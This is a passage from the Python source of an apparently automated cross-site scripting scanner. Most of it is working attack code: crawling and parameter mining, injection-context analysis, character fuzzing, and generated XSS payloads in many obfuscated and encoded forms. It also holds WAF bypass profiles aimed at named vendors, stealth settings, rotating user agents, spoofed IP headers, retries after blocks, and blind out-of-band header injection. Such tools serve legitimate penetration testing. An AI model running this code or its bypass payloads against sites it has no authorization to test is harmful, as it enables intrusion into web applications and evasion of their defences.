            if cookies:
                try:
                    await ctx.add_cookies(cookies)
                except Exception:
                    pass
            await page.goto(url, timeout=NAV_TIMEOUT, wait_until="domcontentloaded")
            log_oob(f"OOB payload sent via [bright_yellow]{header_name}[/] header.")
        except Exception as e:
            log_warn(f"OOB header injection ({header_name}) error: {type(e).__name__}")
        finally:
            if page:
                try:
                    await page.close()
                except Exception:
                    pass


# ══════════════════════════════════════════════════════════════
#  FEATURE: HUMAN-LIKE INTERACTION
# ══════════════════════════════════════════════════════════════
async def human_interact(page) -> None:
    try:
        await page.evaluate(
            "window.scrollTo({top:document.body.scrollHeight,behavior:'smooth'})"
        )
        await asyncio.sleep(0.35)
        btns = await page.query_selector_all(
            "button, input[type='submit'], input[type='button'], a[href='#']"
        )
        for btn in btns[:MAX_BTN_CLICKS]:
            try:
                await btn.click(timeout=700, force=True)
                await asyncio.sleep(0.12)
            except Exception:
                pass
        hover_els = await page.query_selector_all("img, a")
        for el in hover_els[:4]:
            try:
                await el.hover(timeout=500)
                await asyncio.sleep(0.08)
            except Exception:
                pass
        await page.evaluate("window.scrollTo({top:0,behavior:'smooth'})")
        await asyncio.sleep(0.15)
    except Exception:
        pass


# ══════════════════════════════════════════════════════════════
#  WAF DETECTION
# ══════════════════════════════════════════════════════════════
async def detect_waf(page, url: str) -> str | None:
    try:
        resp = await page.goto(url, timeout=NAV_TIMEOUT, wait_until="domcontentloaded")
        if not resp:
            return None
        hdrs  = resp.headers
        body  = (await page.content()).lower()
        combo = " ".join(v.lower() for v in hdrs.values()) + " " + body
        for sig in WAF_SIGNATURES:
            if sig in combo:
                return sig.upper()
        misc = hdrs.get("server","") + hdrs.get("via","") + hdrs.get("x-powered-by","")
        if any(w in misc.lower() for w in ("waf","shield","guard","protect")):
            return "UNKNOWN WAF"
    except Exception:
        pass
    return None


# ══════════════════════════════════════════════════════════════
#  CONTEXT ANALYSER
# ══════════════════════════════════════════════════════════════
async def analyse_context(page, url: str, param: str, nav_timeout: int) -> ContextAnalysis:
    token = gen_token(14)
    ca    = ContextAnalysis(token=token)
    try:
        await page.goto(inject_url(url, param, token), timeout=nav_timeout,
                        wait_until="domcontentloaded")
        html = await page.content()
    except Exception as e:
        log_warn(f"Context analysis error: {e}")
        return ca

    ca.reflection = html.count(token)
    if ca.reflection == 0:
        ca.context = InjectionContext.NOT_REFLECTED
        return ca

    pos    = html.find(token)
    before = html[:pos]
    ca.raw_before = before[-200:]

    js_open, js_close = before.rfind("<script"), before.rfind("</script")
    if js_open != -1 and js_open > js_close:
        frag = before[js_open:]
        if   frag.count('"') % 2:  ca.context = InjectionContext.SCRIPT_STRING_DQ
        elif frag.count("'") % 2:  ca.context = InjectionContext.SCRIPT_STRING_SQ
        elif frag.count("`") % 2:  ca.context = InjectionContext.SCRIPT_STRING_BT
        else:                       ca.context = InjectionContext.SCRIPT_BARE
        return ca

    if before.rfind("<!--") > before.rfind("-->"):
        ca.context = InjectionContext.COMMENT
        return ca

    if before.rfind("<style") > before.rfind("</style"):
        ca.context = InjectionContext.STYLE
        return ca

    tag_open, tag_close = before.rfind("<"), before.rfind(">")
    if tag_open != -1 and tag_open > tag_close:
        frag = before[tag_open:]
        dq, sq = frag.count('"') % 2, frag.count("'") % 2
        if   dq: ca.context = InjectionContext.ATTRIBUTE_DQ
        elif sq: ca.context = InjectionContext.ATTRIBUTE_SQ
        elif re.search(r'=\s*$', frag): ca.context = InjectionContext.ATTRIBUTE_BARE
        else:    ca.context = InjectionContext.ATTR_NAME
        return ca

    ca.context = InjectionContext.HTML_BODY
    return ca


def build_context_payloads(payloads: list[str], ca: ContextAnalysis) -> list[str]:
    escapes = CONTEXT_ESCAPES.get(ca.context, [""])
    result, seen = [], set()
    for esc in escapes:
        for pl in payloads:
            combined = esc + pl
            if combined not in seen:
                seen.add(combined); result.append(combined)
    return result


# ══════════════════════════════════════════════════════════════
#  FUZZING ENGINE
# ══════════════════════════════════════════════════════════════
def _extract_probe_segment(text: str, tok_a: str, tok_b: str) -> str:
    """Return the text between tok_a and tok_b, or '' if not found in order."""
    if not text:
        return ""
    pos_a, pos_b = text.find(tok_a), text.find(tok_b)
    if pos_a == -1 or pos_b == -1 or pos_b <= pos_a:
        return ""
    return text[pos_a + len(tok_a): pos_b]


async def fuzz_chars(page, url: str, param: str, nav_timeout: int) -> FuzzResult:
    """
    Probe which PROBE_CHARS survive injection.

    NOTE: page.content() returns the browser's re-serialized DOM outerHTML,
    which ALWAYS HTML-entity-encodes literal < and > in text nodes — even
    when the target app performs zero sanitization. That produced false
    "blocked" results. Instead we check the RAW HTTP response body (via a
    page.on("response") listener), which reflects exactly what the server
    sent. For SPA/DOM-rendered cases where the raw body won't contain the
    reflected value (e.g. it's injected client-side after fetch/render),
    we additionally check document.body.textContent — which, unlike
    outerHTML, does NOT re-encode entities.
    """
    fr    = FuzzResult()
    tok_a = gen_token(8)
    tok_b = gen_token(8)
    probe = tok_a + "".join(PROBE_CHARS) + tok_b
    probe_url = inject_url(url, param, probe)

    raw_body = ""

    async def on_response(resp):
        nonlocal raw_body
        try:
            if resp.request.is_navigation_request():
                raw_body = await resp.text()
        except Exception:
            pass

    page.on("response", on_response)
    try:
        await page.goto(probe_url, timeout=nav_timeout, wait_until="domcontentloaded")
    except Exception as e:
        page.remove_listener("response", on_response)
        log_warn(f"Fuzz probe error: {e}")
        fr.blocked = list(PROBE_CHARS)
        return fr
    page.remove_listener("response", on_response)

    dom_text = ""
    try:
        dom_text = await page.evaluate("document.body ? document.body.textContent : ''")
    except Exception:
        pass

    raw_segment = _extract_probe_segment(raw_body, tok_a, tok_b)
    dom_segment = _extract_probe_segment(dom_text, tok_a, tok_b)

    if not raw_segment and not dom_segment:
        log_warn("Fuzz tokens not found in raw response or DOM text — assuming all chars blocked.")
        fr.blocked = list(PROBE_CHARS)
        return fr

    raw_confirmed, dom_only_confirmed = [], []
    for ch in PROBE_CHARS:
        if ch in raw_segment:
            fr.allowed.append(ch)
            raw_confirmed.append(ch)
        elif ch in dom_segment:
            fr.allowed.append(ch)
            dom_only_confirmed.append(ch)
        else:
            fr.blocked.append(ch)

    log_fuzz(
        f"Raw-response check: allowed=[green]{''.join(raw_confirmed) or 'none'}[/]"
    )
    if dom_only_confirmed:
        log_fuzz(
            f"DOM-textContent check (SPA fallback): additional allowed="
            f"[bright_yellow]{''.join(dom_only_confirmed)}[/]"
        )
    log_fuzz(
        f"Blocked (confirmed via both raw-response and DOM): "
        f"[red]{''.join(fr.blocked) or 'none'}[/]"
    )
    return fr


# ══════════════════════════════════════════════════════════════
#  AI HEURISTIC PAYLOAD GENERATOR
# ══════════════════════════════════════════════════════════════
def generate_heuristic_payloads(fuzz: FuzzResult, ctx: ContextAnalysis) -> list[str]:
    ok, bad = fuzz.allowed_set, fuzz.blocked_set
    pl      = []

    def has(*chars)  -> bool: return all(c in ok  for c in chars)
    def lacks(*chars)-> bool: return all(c not in ok for c in chars)

    no_parens = lacks("(", ")")
    call_expr = "alert`1`" if no_parens else "alert(1)"
    b64_call  = base64_obfuscate("alert(1)")

    if has("<", ">"):
        if '"' in ok:
            pl.append(f'<script>document["write"]("<img src=x onerror={call_expr}>")</script>')
        pl += [f"<script>{call_expr}</script>", f"<script>window[`alert`](1)</script>",
               f"<svg/onload={call_expr}>", f"<img src=x onerror={call_expr}>",
               f"<body onload={call_expr}>", f"<details open ontoggle={call_expr}>",
               f"<input autofocus onfocus={call_expr}>",
               f"<ScRiPt>{call_expr}</sCrIpT>", f"<SCRIPT>{call_expr}</SCRIPT>",
               f"<script\t>{call_expr}</script>"]
        if has("/"):
            pl.append(f"<script/>{call_expr}</script>")
    elif has('"', ">") and not has("<"):
        pl += [f'" onmouseover={call_expr} x="', f'" autofocus onfocus={call_expr} x="',
               f'"><img src=x onerror={call_expr}>']
        if has("'"):
            pl.append(f"' onmouseover={call_expr} x='")
    elif has("'", ">") and not has("<"):
        pl += [f"' onmouseover={call_expr} x='", f"' autofocus onfocus={call_expr} x='"]

    if ctx.context in (InjectionContext.SCRIPT_BARE, InjectionContext.SCRIPT_STRING_DQ,
                       InjectionContext.SCRIPT_STRING_SQ, InjectionContext.SCRIPT_STRING_BT):
        if ";" in ok:
            pl += [f";{call_expr}//", f";window[`alert`](1)//"]
        if "`" in ok:
            pl.append(f"`-{call_expr}-`")
        pl += [call_expr, "throw/1/,1",
               "[]['flat']['constructor']`${[]['flat']['constructor']`alert\\x281\\x29`}``"]

    if ctx.context == InjectionContext.COMMENT and has("-", ">"):
        pl += [f"--><script>{call_expr}</script>", f"--><img src=x onerror={call_expr}>"]

    # Universal encoded fallbacks
    hex_al = hex_encode_str("alert") + "(1)"
    uni_al = unicode_encode_str("alert") + "(1)"
    pl += [
        "<script>\\u0061lert(1)</script>",
        f"<script>{hex_al}</script>",
        f"<img src=x onerror={hex_al}>",
        f"<script>{uni_al}</script>",
        f"<script>{b64_call}</script>",
        f'<img src=x onerror="{b64_call}">',
        "<script>eval(atob('YWxlcnQoMSk='))</script>",
        "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
        "<script>(()=>{ throw onerror=eval,'alert(1)' })()</script>",
        "<script>[].constructor.constructor('alert(1)')()</script>",
    ]
    if "`" in ok:
        pl += ["<script>Function`alert\\x281\\x29`()</script>",
               f"<script>`${{{call_expr}}}`</script>"]

    # Double URL-encoded variants
    pl += [double_url_encode("<script>alert(1)</script>"),
           double_url_encode("<img src=x onerror=alert(1)>")]

    # Event handler shuffle when angle brackets are unavailable
    script_blocked = "<" in bad or ">" in bad
    if script_blocked or not has("<", ">"):
        pl.extend(event_handler_payloads(call_expr))
        for ev in random.sample(RARE_EVENT_HANDLERS, min(5, len(RARE_EVENT_HANDLERS))):
            pl += [f"<details open {rand_case(ev)}=\"{b64_call}\">",
                   f"<img src=1 {rand_case(ev)}=\"{b64_call}\">"]

    # Deduplicate preserving order
    seen:   set[str] = set()
    unique: list[str] = []
    for p in pl:
        if p not in seen:
            seen.add(p); unique.append(p)

    log_ai(
        f"AI generated [bold bright_magenta]{len(unique)}[/] payloads "
        f"(ctx=[{ctx.context.color}]{ctx.context.label}[/] "
        f"ok=[green]{len(ok)}[/] blocked=[red]{len(bad)}[/] "
        f"ev-shuffle={'ON' if script_blocked or not has('<','>') else 'OFF'})"
    )
    return unique


# ══════════════════════════════════════════════════════════════
#  WAF-SPECIFIC BYPASS PROFILES
# ══════════════════════════════════════════════════════════════
def _waf_base_payloads() -> list[str]:
    return [
        "<svg onload=alert(1)>",
        "<img src=x onerror=alert(1)>",
        "<script>alert(1)</script>",
        "<details open ontoggle=alert(1)>",
        "<body onload=alert(1)>",
    ]


def _build_waf_profiles() -> dict[str, dict]:
    base = _waf_base_payloads()
    profiles: dict[str, dict] = {}

    # Cloudflare — case randomization + comment-junk + null-byte-adjacent tricks
    cf_payloads = []
    for p in base:
        cf_payloads.append(apply_case_randomizer(p))
        cf_payloads.append(inject_comment_junk(p))
    cf_payloads += [
        "<svg%00/onload=alert(1)>",
        "<img src=x\x00 onerror=alert(1)>",
        "<sVg\t/onload=alert(1)>",
        "<svg onload=\\u0061lert(1)>",
    ]
    profiles["CLOUDFLARE"] = {
        "techniques": "case randomization + comment-junk injection + null-byte-adjacent tricks",
        "payloads": cf_payloads,
    }

    # F5 (F5 ASM/BIG-IP) — alternate encoding + split JS identifiers + double URL-encoding
    hex_al = hex_encode_str("alert") + "(1)"
    uni_al = unicode_encode_str("alert") + "(1)"
    profiles["F5"] = {
        "techniques": "alternate encoding (hex/unicode) + split JS identifiers + double URL-encoding",
        "payloads": [
            f"<script>{hex_al}</script>",
            f"<script>{uni_al}</script>",
            f"<img src=x onerror={hex_al}>",
            "<script>wi\\u006edow['al'+'ert'](1)</script>",
            "<svg><script>al\\u0065rt(1)</script></svg>",
            double_url_encode("<script>alert(1)</script>"),
        ],
    }

    # Akamai — whitespace/tag splitting + rare event handler shuffle
    profiles["AKAMAI"] = {
        "techniques": "whitespace/tag splitting + rare event handler shuffle",
        "payloads": event_handler_payloads("alert(1)")[:10] + [
            "<svg\n onload=alert(1)>",
            "<img\tsrc=x\tonerror=alert(1)>",
        ],
    }

    # Imperva — base64/eval obfuscation + double URL-encoding + prototype-chain tricks
    b64 = base64_obfuscate("alert(1)")
    profiles["IMPERVA"] = {
        "techniques": "base64/eval obfuscation + double URL-encoding + prototype-chain tricks",
        "payloads": [
            f"<script>{b64}</script>",
            f'<img src=x onerror="{b64}">',
            double_url_encode("<img src=x onerror=alert(1)>"),
            "<script>[]['flat']['constructor']`${[]['flat']['constructor']`alert\\x281\\x29`}``</script>",
        ],
    }

    # Generic fallback — any other/unrecognised detected WAF signature
    profiles["GENERIC"] = {
        "techniques": "case randomization + double URL-encoding (generic evasion)",
        "payloads": [apply_case_randomizer(p) for p in base]
                    + [double_url_encode(p) for p in base[:2]],
    }
    return profiles


WAF_BYPASS_PROFILES: dict[str, dict] = _build_waf_profiles()


def get_waf_bypass_profile(waf_name: str | None) -> tuple[str, list[str]]:
    """Return (profile_key, payloads) for a detected WAF name, or generic fallback."""
    if not waf_name:
        return ("", [])
    key = waf_name.upper()
    if key in WAF_BYPASS_PROFILES:
        return (key, WAF_BYPASS_PROFILES[key]["payloads"])
    return ("GENERIC", WAF_BYPASS_PROFILES["GENERIC"]["payloads"])


def select_smart_payloads(
    payloads:      list[str],
    fuzz:          FuzzResult,
    ca:            ContextAnalysis,
    xss_report_id: str | None = None,
    max_count:     int        = MAX_RANKED_PL,
    waf:           str | None = None,
) -> list[str]:
    ai_pls  = generate_heuristic_payloads(fuzz, ca)
    ctx_pls = build_context_payloads(payloads, ca)
    oob_pls = build_blind_payloads(xss_report_id) if xss_report_id else []

    waf_key, waf_pls = get_waf_bypass_profile(waf)
    if waf_pls:
        log_waf(
            f"WAF bypass profile activated: [bold bright_magenta]{waf_key}[/] "
            f"([bright_yellow]{len(waf_pls)}[/] payloads — "
            f"{WAF_BYPASS_PROFILES[waf_key]['techniques']})"
        )

    # Comment-junk variants on top 300 base payloads
    top_base = fuzz.rank_payloads(ctx_pls, limit=300)
    junk_pls = [p for p in [inject_comment_junk(x) for x in top_base]
                if p not in set(top_base)]

    # Case-randomized variants on top AI + base
    case_src = ai_pls[:40] + top_base[:60]
    case_pls = [p for p in [apply_case_randomizer(x) for x in case_src]
                if p not in set(case_src)]

    # Priority payloads (WAF profile first, then AI/OOB/junk/case), order-preserving dedup
    priority_seen: set[str] = set()
    priority_ordered: list[str] = []
    for p in waf_pls + ai_pls + oob_pls + junk_pls + case_pls:
        if p not in priority_seen:
            priority_seen.add(p); priority_ordered.append(p)

    combined = priority_ordered + ctx_pls
    seen: set[str] = set()
    deduped = []
    for p in combined:
        if p not in seen:
            seen.add(p); deduped.append(p)

    ranked = fuzz.rank_payloads([p for p in deduped if p not in priority_seen], limit=max_count)

    log_ai(
        f"Final list: [bold bright_yellow]{len(priority_ordered) + len(ranked)}[/] "
        f"(WAF={len(waf_pls)} AI={len(ai_pls)} OOB={len(oob_pls)} junk={len(junk_pls)} "
        f"case={len(case_pls)} ranked={len(ranked)})"
    )
    return priority_ordered + ranked


# ══════════════════════════════════════════════════════════════
#  DOM XSS & SPA SUPPORT
# ══════════════════════════════════════════════════════════════
async def check_dom_xss(page, base_url: str, payloads: list[str],
                        nav_timeout: int, jitter_min: float, jitter_max: float,
                        dialog_timeout: int = DIALOG_TIMEOUT) -> list[dict]:
    """
    Test URL fragments (#payload) for DOM-based / SPA XSS.
    Also injects a MutationObserver to catch dynamically inserted scripts.
    Returns list of confirmed DOM XSS findings.
    """
    findings = []
    base     = base_url.split("#")[0]

    log_dom(f"Testing [bright_yellow]{min(len(payloads), 60)}[/] payloads via URL fragments ...")

    for payload in payloads[:60]:   # test top 60 on fragments
        if is_shutdown_requested():
            break
        try:
            dialog_triggered = False
            dialog_message   = ""

            async def on_dialog(d):
                nonlocal dialog_triggered, dialog_message
                dialog_triggered, dialog_message = True, d.message
                await d.dismiss()

            page.on("dialog", on_dialog)

            # Inject MutationObserver before navigation
            await page.add_init_script(DOM_MUTATION_SCRIPT)

            fragment_url = base + "#" + encode_payload(payload)
            await asyncio.sleep(random.uniform(jitter_min, jitter_max))

            try:
                await page.goto(fragment_url, timeout=nav_timeout,
                                wait_until="domcontentloaded")
            except Exception:
                page.remove_listener("dialog", on_dialog)
                continue

            await human_interact(page)

            # Poll in small increments instead of a flat sleep, exiting the
            # moment a dialog fires or the DOM-hook flag flips true. Also
            # checks both flags every iteration so --fast's shorter
            # dialog_timeout is actually respected here too.
            dom_triggered = False
            dom_msg       = ""
            elapsed_ms = 0
            poll_interval_ms = 100
            while elapsed_ms < dialog_timeout:
                if dialog_triggered:
                    break
                try:
                    dom_triggered = await page.evaluate("window.__xss_dom_triggered || false")
                except Exception:
                    pass
                if dom_triggered:
                    break
                await asyncio.sleep(poll_interval_ms / 1000)
                elapsed_ms += poll_interval_ms

            try:
                dom_msg = await page.evaluate("window.__xss_dom_msg || ''")
            except Exception:
                pass

            if dialog_triggered or dom_triggered:
                msg = dialog_message or dom_msg
                log_dom(
                    f"[bold bright_green]DOM XSS![/] "
                    f"fragment=[cyan]{payload[:60]}[/] "
                    f"dialog={repr(msg)}"
                )
                findings.append({
                    "url":       fragment_url,
                    "param":     "#fragment",
                    "payload":   payload,
                    "dialog":    msg,
                    "xss_type":  "DOM",
                    "source_page": base_url,
                    "screenshot": None,
                })

            page.remove_listener("dialog", on_dialog)

        except Exception:
            pass

    return findings


# ══════════════════════════════════════════════════════════════
#  PARAMETER MINER
# ══════════════════════════════════════════════════════════════
_JS_SKIP = frozenset({
    "function","return","const","let","var","true","false","null","undefined",
    "this","class","new","import","export","default","from","async","await",
    "if","else","for","while","do","try","catch","finally","switch","case",
    "break","continue","typeof","instanceof","void","delete","in","of",
    "type","name","value","data","url","method","headers","body","key",
    "length","size","index","count","id","src","href","path","host","port",
    "error","message","status","code","text","html","json","xml","form",
    "input","output","result","response","request","event","target","self",
})

async def mine_params(page, url: str, nav_timeout: int) -> list[ScanTarget]:
    targets: list[ScanTarget] = []
    seen:    set[str]         = set()
    json_eps: list[tuple[str, dict]] = []

    async def on_request(req):
        if req.method.upper() != "POST":
            return
        if "json" not in req.headers.get("content-type", ""):
            return
        try:
            json_eps.append((req.url, json.loads(req.post_data or "{}")))
        except Exception:
            pass

    page.on("request", on_request)
    try:
        await page.goto(url, timeout=nav_timeout, wait_until="networkidle")
    except Exception:
        try:
            await page.goto(url, timeout=nav_timeout, wait_until="domcontentloaded")
        except Exception:
            page.remove_listener("request", on_request)
            return targets
    page.remove_listener("request", on_request)

    try:
        for el in await page.query_selector_all("input[type='hidden']"):
            name = await el.get_attribute("name")
            if name and name not in seen:
                seen.add(name)
                targets.append(ScanTarget(url=url, param=name, input_type="hidden",
                                          source_page=url, is_hidden=True))
                log_mine(f"Hidden input: [yellow]{name}[/]")
    except Exception:
        pass

    try:
        js_params: set[str] = set()
        for sel in await page.query_selector_all("script:not([src])"):
            src = await sel.inner_text()
            for m in re.finditer(r'["\']([a-zA-Z_][a-zA-Z0-9_]{1,40})["\']'
                                  r'\s*(?::|,|\))', src):
                p = m.group(1)
                if p not in _JS_SKIP and len(p) >= 2:
                    js_params.add(p)
        for p in sorted(js_params):
            if p not in seen:
                seen.add(p)
                targets.append(ScanTarget(url=url, param=p, input_type="js_inferred",
                                          source_page=url))
                log_mine(f"JS param: [yellow]{p}[/]")
    except Exception:
        pass

    for ep_url, body in json_eps:
        for dotkey, val in _flatten_json(body):
            if not isinstance(val, str):
                continue
            key_last = dotkey.split(".")[-1].split("[")[0]
            if key_last in seen:
                continue
            seen.add(key_last)
            targets.append(ScanTarget(url=ep_url, param=dotkey, form_method="post_json",
                                      input_type="json", source_page=url,
                                      is_json=True, json_body=body))
            log_mine(f"JSON POST: [yellow]{dotkey}[/] @ [cyan]{ep_url[-50:]}[/]")

    return targets


# ══════════════════════════════════════════════════════════════
#  CRAWLER
# ══════════════════════════════════════════════════════════════
async def crawl_links(page, base_url: str, max_pages: int, nav_timeout: int) -> list[str]:
    visited: set[str]  = set()
    queue:   list[str] = [base_url]
    found:   list[str] = []
    while queue and len(found) < max_pages:
        cur = queue.pop(0).split("#")[0]
        if cur in visited:
            continue
        visited.add(cur)
        try:
            await page.goto(cur, timeout=nav_timeout, wait_until="domcontentloaded")
        except Exception:
            continue
        found.append(cur)
        log_crawl(f"[{len(found)}/{max_pages}] {cur}")
        try:
            hrefs = await page.eval_on_selector_all("a[href]", "els=>els.map(e=>e.href)")
        except Exception:
            hrefs = []
        for h in hrefs:
            h = h.split("#")[0].strip()
            if h and same_origin(base_url, h) and h not in visited and h not in queue:
                queue.append(h)
    log_crawl(f"Done — [bright_green]{len(found)}[/] pages.")
    return found


# ══════════════════════════════════════════════════════════════
#  FORM DISCOVERY
# ══════════════════════════════════════════════════════════════
async def discover_forms(page, page_url: str) -> list[ScanTarget]:
    targets: list[ScanTarget] = []
    SKIP = {"submit","button","image","reset","checkbox","radio","file","color","range"}
    try:
        forms = await page.query_selector_all("form")
    except Exception:
        return targets

    for fi, form in enumerate(forms):
        try:
            raw_action = await form.get_attribute("action") or page_url
            method     = (await form.get_attribute("method") or "get").lower().strip()
        except Exception:
            raw_action, method = page_url, "get"
        action = urllib.parse.urljoin(page_url, raw_action)

        try:
            inputs = await form.query_selector_all(
                "input:not([type='submit']):not([type='button'])"
                ":not([type='image']):not([type='reset'])"
                ":not([type='checkbox']):not([type='radio'])"
                ":not([type='file']),textarea,select"
            )
        except Exception:
            continue

        for inp in inputs:
            try:
                name  = await inp.get_attribute("name")
                itype = (await inp.get_attribute("type") or "text").lower()
                tag   = await inp.evaluate("el=>el.tagName.toLowerCase()")
            except Exception:
                continue
            if not name or (tag == "input" and itype in SKIP):
                continue
            targets.append(ScanTarget(
                url=action, param=name, form_action=action,
                form_method=method, input_type=itype or tag,
                source_page=page_url, is_hidden=(itype == "hidden"),
            ))
            log_form(f"Form[{fi+1}][{method.upper()}] → "
                     f"[{'dim' if itype=='hidden' else 'bold yellow'}]{name}[/] "
                     f"(type=[dim]{itype or tag}[/dim])")
    return targets


# ══════════════════════════════════════════════════════════════
#  AUTO-DISCOVER ORCHESTRATOR
# ══════════════════════════════════════════════════════════════
async def auto_discover(ctx, base_url: str, max_pages: int,
                        nav_timeout: int, mine: bool = True) -> list[ScanTarget]:
    log_info("[bold]Auto-Discovery[/] — crawl + forms + param mining ...")
    console.print()

    crawler = await ctx.new_page()
    await apply_stealth(crawler)
    await setup_page_bypass(crawler, rand_ua(), rand_ip())
    pages = await crawl_links(crawler, base_url, max_pages, nav_timeout)
    console.print()

    all_targets: list[ScanTarget] = []
    seen: set[tuple[str, str]]    = set()

    for pu in pages:
        try:
            await crawler.goto(pu, timeout=nav_timeout, wait_until="domcontentloaded")
        except Exception:
            continue
        for t in await discover_forms(crawler, pu):
            k = (t.url, t.param)
            if k not in seen:
                seen.add(k); all_targets.append(t)

        if mine:
            mp = await ctx.new_page()
            try:
                await apply_stealth(mp)
                await setup_page_bypass(mp, rand_ua(), rand_ip())
                for t in await mine_params(mp, pu, nav_timeout):
                    k = (t.url, t.param)
                    if k not in seen:
                        seen.add(k); all_targets.append(t)
            finally:
                await mp.close()

    await crawler.close()
    console.print()

    if all_targets:
        tbl = Table(title=f"[bold bright_yellow] Discovered Targets ({len(all_targets)}) [/]",
                    box=box.ROUNDED, border_style="bright_yellow", show_lines=True)
        tbl.add_column("#",      style="dim",               width=4)
        tbl.add_column("Source", style="cyan",              no_wrap=False)
        tbl.add_column("Method", style="bright_magenta",    width=6)
        tbl.add_column("Param",  style="bold bright_yellow",width=18)
        tbl.add_column("Type",   style="dim",               width=12)
        for i, t in enumerate(all_targets, 1):
            tbl.add_row(str(i), t.source_page.split("?")[0][-55:],
                        t.form_method.upper(), t.param, t.input_type)
        console.print(tbl)
        console.print()
    else:
        log_warn("No injectable targets discovered.")
    return all_targets


# ══════════════════════════════════════════════════════════════
#  SINGLE PAYLOAD TEST
# ══════════════════════════════════════════════════════════════
async def poll_until_dialog(check_fn, timeout_ms: int, poll_interval_ms: int = 100) -> None:
    """
    Poll in small increments instead of a flat sleep, exiting the moment
    check_fn() returns True (dialog already fired). Avoids wasting the full
    DIALOG_TIMEOUT on every single payload when most don't trigger anything.
    """
    elapsed_ms = 0
    while elapsed_ms < timeout_ms and not check_fn():
        await asyncio.sleep(poll_interval_ms / 1000)
        elapsed_ms += poll_interval_ms


async def test_payload(
    ctx,
    target:          ScanTarget,
    payload:         str,
    semaphore:       AdaptiveConcurrency,
    results:         list,
    progress,
    task_id,
    nav_timeout:     int   = NAV_TIMEOUT,
    jitter_min:      float = JITTER_MIN,
    jitter_max:      float = JITTER_MAX,
    show_browser:    bool  = False,
    take_screenshot: bool  = False,
    cookies:         list  = None,
    proxy:           str   = None,
    dialog_timeout:  int   = DIALOG_TIMEOUT,
    retry_delay:     int   = RATE_LIMIT_DELAY,
    background_tasks: list = None,
) -> None:
    async with semaphore:
        page = None
        try:
            ua, ip = rand_ua(), rand_ip()
            page   = await ctx.new_page()

            # Stealth + bypass on every page
            await apply_stealth(page)
            await setup_page_bypass(page, ua, ip)

            if cookies:
                try:
                    await ctx.add_cookies(cookies)
                except Exception:
                    pass

            dialog_triggered = False
            dialog_message   = ""

            async def on_dialog(d):
                nonlocal dialog_triggered, dialog_message
                dialog_triggered, dialog_message = True, d.message
                await d.dismiss()

            page.on("dialog", on_dialog)
            encoded = encode_payload(payload)

            if target.is_json and target.form_method == "post_json":
                try:
                    body = dict(target.json_body)
                    _deep_set(body, target.param, payload)
                    await asyncio.sleep(random.uniform(jitter_min, jitter_max))
                    await page.evaluate(
                        """async ({url, body}) => {
                            await fetch(url, {method:'POST',
                                headers:{'Content-Type':'application/json'},
                                credentials:'include', body:JSON.stringify(body)});
                        }""",
                        {"url": target.url, "body": body},
                    )
                    await poll_until_dialog(lambda: dialog_triggered, dialog_timeout)
                    await human_interact(page)
                except Exception:
                    pass
            else:
                target_url = inject_url(target.url, target.param, encoded, pre_encoded=True)
                await asyncio.sleep(random.uniform(jitter_min, jitter_max))

                retries = 0
                while retries <= MAX_RETRIES:
                    try:
                        resp   = await page.goto(target_url, timeout=nav_timeout,
                                                 wait_until="domcontentloaded")
                        status = resp.status if resp else 0
                        if status in (403, 429):
                            retries += 1
                            await semaphore.record_backoff()
                            log_warn(f"Status [bold red]{status}[/] → backoff {retry_delay}s "
                                     f"(retry {retries}/{MAX_RETRIES})")
                            await asyncio.sleep(retry_delay)
                            ua, ip = rand_ua(), rand_ip()
                            await setup_page_bypass(page, ua, ip)
                            continue
                        break
                    except (PWTimeout, Exception):
                        break

                await human_interact(page)
                await poll_until_dialog(lambda: dialog_triggered, dialog_timeout)

            if dialog_triggered:
                final_url = inject_url(target.url, target.param, encoded, pre_encoded=True)
                entry = {
                    "source_page":     target.source_page,
                    "url":             final_url,
                    "param":           target.param,
                    "payload":         payload,
                    "encoded_payload": encoded,
                    "dialog":          dialog_message,
                    "spoofed_ip":      ip,
                    "user_agent":      ua,
                    "is_json":         target.is_json,
                    "xss_type":        "Reflected",
                    "screenshot":      None,
                    "timestamp":       datetime.now().isoformat(),
                }
                log_hit(
                    f"[bold bright_green]XSS![/] "
                    f"param=[yellow]{target.param}[/] "
                    f"dialog={repr(dialog_message)} "
                    f"payload=[cyan]{payload[:60]}[/]"
                )
                if take_screenshot:
                    entry["screenshot"] = await take_poc_screenshot(page, entry)
                results.append(entry)
                if show_browser:
                    replay_task = asyncio.ensure_future(
                        replay_poc_visible(entry["url"], cookies or [], proxy)
                    )
                    if background_tasks is not None:
                        background_tasks.append(replay_task)

        except Exception as e:
            if is_target_closed_error(e):
                log_warn(f"test_payload ({target.param}): browser closed (expected on interrupt).")
            else:
                log_warn(f"test_payload error ({target.param}): {type(e).__name__}")
        finally:
            if page:
                try:
                    await page.close()
                except Exception:
                    pass
            progress.advance(task_id)


# ══════════════════════════════════════════════════════════════
#  SCAN ONE TARGET
# ══════════════════════════════════════════════════════════════
async def scan_one_target(
    ctx,
    target:          ScanTarget,
    payloads:        list[str],
    semaphore:       AdaptiveConcurrency,
    results:         list,
    progress,
    task_id,
    nav_timeout:     int   = NAV_TIMEOUT,
    jitter_min:      float = JITTER_MIN,
    jitter_max:      float = JITTER_MAX,
    show_browser:    bool  = False,
    take_screenshot: bool  = False,
    cookies:         list  = None,
    proxy:           str   = None,
    xss_report_id:   str   = None,
    dialog_timeout:  int   = DIALOG_TIMEOUT,
    retry_delay:     int   = RATE_LIMIT_DELAY,
    background_tasks: list = None,
    waf:             str   = None,
) -> bool:
    """Returns True if the scan was cut short by a cooperative shutdown request."""
    console.print()
    console.print(Rule(f"[bold bright_cyan] {target.label} [/]", style="bright_cyan"))

    ap = None
    ca = ContextAnalysis()
    fr = FuzzResult(blocked=list(PROBE_CHARS))  # safe default

    try:
        ap = await ctx.new_page()
        await apply_stealth(ap)
        await setup_page_bypass(ap, rand_ua(), rand_ip())

        log_ctx(f"Analysing injection context for [yellow]{target.param}[/] ...")
        ca = await analyse_context(ap, target.url, target.param, nav_timeout)
        log_ctx(f"Context → [{ca.context.color}]{ca.context.label}[/]  "
                f"Reflections=[bright_yellow]{ca.reflection}[/]")

        log_fuzz(f"Probing {len(PROBE_CHARS)} special chars ...")
        fr = await fuzz_chars(ap, target.url, target.param, nav_timeout)
        log_fuzz(fr.summary())
    except Exception as e:
        log_warn(f"Analysis error: {e}")
    finally:
        if ap:
            try:
                await ap.close()
            except Exception:
                pass

    smart = select_smart_payloads(payloads, fr, ca, xss_report_id=xss_report_id, waf=waf)
    log_info(f"Payload list: [bright_yellow]{len(smart)}[/] ready")
